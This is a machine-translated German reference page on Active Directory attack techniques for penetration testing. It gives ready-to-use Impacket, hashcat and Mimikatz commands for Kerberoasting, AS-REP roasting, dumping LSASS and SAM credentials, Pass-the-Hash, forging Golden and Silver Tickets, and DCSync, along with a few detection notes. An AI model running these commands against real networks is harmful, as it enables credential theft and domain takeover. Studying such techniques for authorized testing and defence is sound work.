---
title: "Active Directory-Angriffe"
category: techniques
tags: [security, active-directory, kerberos, mimikatz, bloodhound, pentesting]
level: 3
source_sha256: 9247c2255453c4a0d5cae1a3ce0f40fc58a380b5f5a8da4856c87f7b08c7bd53
translation: machine
translated_at: '2026-10-24'
---
# Active Directory-Angriffe {#active-directory-attacks}

Angriffstechniken für Active Directory: LDAP-Enumeration, BloodHound-Analyse von Angriffspfaden, Kerberoasting, AS-REP Roasting, Pass-the-Hash/Ticket, Golden/Silver Tickets, DCSync und das Auslesen von Zugangsdaten mit Mimikatz.

## Wichtige Fakten {#key-facts}
- BloodHound visualisiert den kürzesten Pfad zu Domain Admin, unverzichtbar für AD-Pentests
- Kerberoasting zielt auf Dienstkonten mit SPNs und schwachen Passwörtern ab
- Golden Ticket = gefälschtes TGT, das uneingeschränkten Domänenzugriff gewährt; übersteht Passwortzurücksetzungen (außer dem doppelten KRBTGT-Reset)
- DCSync erfordert die Berechtigung Replicating Directory Changes (Domain Admins, DC-Konten)
- Mimikatz extrahiert Klartextpasswörter aus dem LSASS-Speicher (sofern WDigest aktiviert ist)

## LDAP-Enumeration {#ldap-enumeration}
```bash
# ldapsearch
ldapsearch -x -H ldap://dc01.corp.local -b "dc=corp,dc=local" \
  -s sub "(objectClass=user)"

# BloodHound data collection
bloodhound-python -c All -u user -p password -d corp.local -ns 10.0.0.1
# Import into BloodHound GUI -> "Shortest Path to Domain Admin"
```

BloodHound erfasst Benutzer, Gruppen, Computer, Sitzungen, ACLs und Vertrauensstellungen. Es findet Angriffspfade, die bei manueller Analyse unsichtbar bleiben.

## Kerberoasting {#kerberoasting}
TGS-Tickets von Dienstkonten extrahieren und offline knacken:
```bash
# Impacket
GetUserSPNs.py corp.local/user:password -dc-ip 10.0.0.1 -request

# Crack with hashcat
hashcat -m 13100 tgs_hashes.txt wordlist.txt
```
Ziele sind Dienstkonten mit SPNs, die schwache Passwörter besitzen. Jeder Domänenbenutzer kann TGS-Tickets für beliebige SPNs anfordern.

## AS-REP Roasting {#as-rep-roasting}
Konten angreifen, bei denen „Do not require Kerberos pre-authentication“ gesetzt ist:
```bash
GetNPUsers.py corp.local/ -dc-ip 10.0.0.1 -usersfile users.txt -no-pass
hashcat -m 18200 asrep_hashes.txt wordlist.txt
```

## Zugangsdaten auslesen mit Mimikatz {#credential-harvesting-with-mimikatz}
```sql
privilege::debug                        # Get debug privilege
sekurlsa::logonpasswords               # Dump cleartext passwords from LSASS
sekurlsa::wdigest                      # WDigest passwords
lsadump::sam                           # Dump local SAM database
lsadump::dcsync /user:Administrator    # DCSync attack
lsadump::dcsync /domain:corp.local /all # All domain hashes
```

## Pass-the-Hash (PtH) {#pass-the-hash-pth}
Authentifizierung mit einem NTLM-Hash, ohne das Passwort zu kennen:
```bash
# Impacket
psexec.py -hashes :NTLM_HASH Administrator@10.0.0.1
wmiexec.py -hashes :NTLM_HASH Administrator@10.0.0.1
```

## Pass-the-Ticket (PtT) {#pass-the-ticket-ptt}
```python
# Export ticket from memory (Mimikatz)
kerberos::list /export
# Import on another machine
kerberos::ptt ticket.kirbi
```

## Golden Ticket {#golden-ticket}
Gefälschtes TGT mit Domain-Admin-Rechten. Erfordert den NTLM-Hash des KRBTGT-Kontos und die Domain-SID:
```bash
kerberos::golden /user:FakeAdmin /domain:corp.local \
  /sid:S-1-5-21-... /krbtgt:HASH /ptt
```
- Gewährt uneingeschränkten Domänenzugriff
- Standardmäßig 10 Jahre gültig
- Übersteht alle Passwortzurücksetzungen außer dem doppelten KRBTGT-Reset (zweimal zurücksetzen, mit mindestens 12 Stunden Abstand)

## Silver Ticket {#silver-ticket}
Gefälschtes TGS für einen bestimmten Dienst (kontaktiert den KDC nicht):
```bash
kerberos::golden /user:FakeUser /domain:corp.local \
  /sid:S-1-5-21-... /target:server.corp.local \
  /service:cifs /rc4:SERVICE_HASH /ptt
```

## DCSync {#dcsync}
Replikation der Domänencontroller-Daten, um alle Passwort-Hashes zu extrahieren:
```bash
secretsdump.py corp.local/admin:password@10.0.0.1
```
Voraussetzung: Berechtigung Replicating Directory Changes (standardmäßig Domain Admins und DC-Computerkonten).

## AD-Struktur im Überblick {#ad-structure-quick-reference}
- **Forest**: oberste Vertrauensgrenze
- **Domain**: administrative Grenze innerhalb des Forests
- **OU**: Organisationscontainer, Ziel für die GPO-Verknüpfung
- **Trusts**: Beziehungen zwischen Domänen (einseitig, beidseitig, transitiv)
- **GPO**: Group Policy Objects, hierarchisch angewendet: Lokal -> Standort -> Domäne -> OU

## Fallstricke {#gotchas}
- Kerberoasting ist standardmäßig nicht erkennbar; sichtbar nur, wenn die Auditierung von TGS-Anfragen aktiviert ist (Event ID 4769)
- Die Erkennung von Golden Tickets erfordert die Überwachung auf TGT-Auffälligkeiten (Event ID 4768 mit unerwartetem Verschlüsselungstyp)
- Pass-the-Hash funktioniert auch bei deaktiviertem NTLM, sofern zwischengespeicherte Hashes vorhanden sind
- Die Datenerfassung durch BloodHound erzeugt selbst erkennbare LDAP-Abfragen
- Dienstkonten besitzen häufig Domain-Admin-Rechte und Passwörter ohne Ablaufdatum und sind daher bevorzugte Ziele
- DCSync von einem kompromittierten DC-Computerkonto ist legitimer Replikationsverkehr und sehr schwer zu erkennen

## Siehe auch {#see-also}
- [[authentication-and-authorization]]: Details zum Kerberos-Protokoll
- [[privilege-escalation-techniques]]: lokale Rechteausweitung vor domänenweiten Angriffen
- [[windows-security-and-powershell]]: Windows-Event-IDs, Registry, Härtung
- [[penetration-testing-methodology]]: vollständiger Testablauf
